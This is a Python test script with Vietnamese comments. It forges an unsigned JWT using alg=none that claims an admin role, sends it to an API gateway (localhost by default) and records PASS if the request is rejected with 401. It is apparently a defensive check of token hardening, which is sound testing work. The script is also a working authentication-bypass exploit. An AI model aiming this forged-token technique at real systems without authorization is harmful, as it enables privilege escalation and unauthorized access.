import base64
import json
import os
from datetime import datetime, timezone
from pathlib import Path

import requests

API_URL = os.getenv("API_URL", "https://localhost:8443/api/v1/users")
VERIFY_TLS = os.getenv("VERIFY_TLS", "false").lower() == "true"
EVIDENCE_FILE = Path(
    os.getenv(
        "EVIDENCE_FILE",
        "EVIDENCE/attack_results/token-hardening/alg_none_result.txt",
    )
)

def b64url_encode(data: str) -> str:
    return base64.urlsafe_b64encode(data.encode("utf-8")).rstrip(b"=").decode("utf-8")


def save_evidence(report: str) -> None:
    EVIDENCE_FILE.parent.mkdir(parents=True, exist_ok=True)
    EVIDENCE_FILE.write_text(report, encoding="utf-8")
    print(f"[+] Evidence saved: {EVIDENCE_FILE}")


def main() -> None:
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

    print("~ ALG=NONE ATTACK TEST ~")
    print("Mục tiêu: giả mạo JWT voi alg=none để xem gateway có chặn hay không.")
    print(f"Target URL: {API_URL}")
    print(f"TLS Verify: {VERIFY_TLS}")

    print("\n[Step 1] Tạo JWT header giả mạo")
    header = {"alg": "none", "typ": "JWT"}
    print(f"header_json: {json.dumps(header, separators=(',', ':'))}")

    print("\n[Step 2] Tạo payload JWT giả mạo")
    payload = {
        "sub": "attacker",
        "role": "admin",
        "email": "attacker@evil.local",
        "exp": 9999999999,
    }
    print(f"payload_json: {json.dumps(payload, separators=(',', ':'))}")

    print("\n[Step 3] Base64URL encode từng phần và lắp token không chữ ký")
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")))
    token = (
        f"{header_b64}."
        f"{payload_b64}."
    )
    print(f"header_b64: {header_b64}")
    print(f"payload_b64: {payload_b64}")
    print("signature: <rong>")
    print(f"forged_token_preview: {token[:80]}...")

    print("\n[Step 4] Gửi request với Authorization: Bearer <forged_token>")
    print(f"HTTP Method: GET {API_URL}")

    response = requests.get(
        API_URL,
        headers={"Authorization": f"Bearer {token}"},
        timeout=15,
        verify=VERIFY_TLS,
    )

    body_text = response.text.strip()
    timestamp = datetime.now(timezone.utc).isoformat()
    pass_fail = "PASS" if response.status_code == 401 else "FAIL"
    result_lines = [
        "~ ALG NONE ATTACK EVIDENCE ~",
        f"timestamp_utc: {timestamp}",
        f"target_url: {API_URL}",
        f"header_json: {json.dumps(header, separators=(',', ':'))}",
        f"payload_json: {json.dumps(payload, separators=(',', ':'))}",
        f"header_b64: {header_b64}",
        f"payload_b64: {payload_b64}",
        f"status_code: {response.status_code}",
        f"verify_tls: {VERIFY_TLS}",
        f"response_body: {body_text}",
        "expected: 401 Unauthorized",
        f"result: {pass_fail}",
    ]
    report = "\n".join(result_lines) + "\n"

    print("\n[Step 5] Đánh giá kết quả")
    print(f"Response status: {response.status_code}")
    print(f"Response body: {body_text}")
    print("Expected: 401")
    print(f"Result: {pass_fail}")

    save_evidence(report)


if __name__ == "__main__":
    main()
